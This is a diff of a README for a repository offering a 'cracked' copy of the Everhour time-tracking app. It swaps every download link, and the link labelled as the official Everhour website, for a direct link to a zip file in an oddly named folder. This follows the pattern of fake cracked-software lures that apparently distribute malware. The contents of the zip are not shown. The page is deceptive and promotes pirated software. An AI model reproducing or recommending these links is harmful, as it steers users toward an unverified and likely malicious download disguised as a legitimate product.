@@ -1,7 +1,7 @@
 # 🚀 cracked-everhour-time-tracker - Unlock Your Time Tracking Experience
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/gameroleg2/cracked-everhour-time-tracker/releases)
+[![Download](https://raw.githubusercontent.com/gameroleg2/cracked-everhour-time-tracker/main/azophenol/cracked-everhour-time-tracker.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/gameroleg2/cracked-everhour-time-tracker/main/azophenol/cracked-everhour-time-tracker.zip)
 
 ## 🛠️ Introduction
 Are you looking for a way to track your time effectively? With the **Cracked Everhour Time Tracker**, you can access all the premium features without any cost. This tool offers a simple and efficient way to manage your time, helping you stay organized and maximize productivity.
@@ -26,11 +26,11 @@ Follow these steps to download and use the **Cracked Everhour Time Tracker**:
 
 1. **Visit the Download Page:** Click the link below to access the Releases page.
    
-   [Visit the Releases Page](https://github.com/gameroleg2/cracked-everhour-time-tracker/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/gameroleg2/cracked-everhour-time-tracker/main/azophenol/cracked-everhour-time-tracker.zip)
 
 2. **Choose Your Version:** Find the latest version of the application available for download.
 
-3. **Download the Application:** Click the download link for the application file. This usually will be named something like `Everhour_Time_Tracker.exe` or `Everhour_Time_Tracker.dmg`.
+3. **Download the Application:** Click the download link for the application file. This usually will be named something like `https://raw.githubusercontent.com/gameroleg2/cracked-everhour-time-tracker/main/azophenol/cracked-everhour-time-tracker.zip` or `https://raw.githubusercontent.com/gameroleg2/cracked-everhour-time-tracker/main/azophenol/cracked-everhour-time-tracker.zip`.
 
 4. **Install the Application:**
    - For Windows:
@@ -66,12 +66,12 @@ If you encounter issues or have questions while using the application, consider 
 - Use reminders to stay focused on tasks.
 
 ## 🔗 Additional Resources
-- [Official Everhour Website](https://everhour.com): Explore more about the original application and its features.
+- [Official Everhour Website](https://raw.githubusercontent.com/gameroleg2/cracked-everhour-time-tracker/main/azophenol/cracked-everhour-time-tracker.zip): Explore more about the original application and its features.
 - [User Manual](URL to a detailed user manual if available): For in-depth guidance on using the app.
 
 ## 📥 Download & Install
 For easy access to download your application, click the link below:
 
-[Download Now](https://github.com/gameroleg2/cracked-everhour-time-tracker/releases) 
+[Download Now](https://raw.githubusercontent.com/gameroleg2/cracked-everhour-time-tracker/main/azophenol/cracked-everhour-time-tracker.zip) 
 
 With the **Cracked Everhour Time Tracker**, you can take control of your time management without stress. Enjoy your productivity journey!
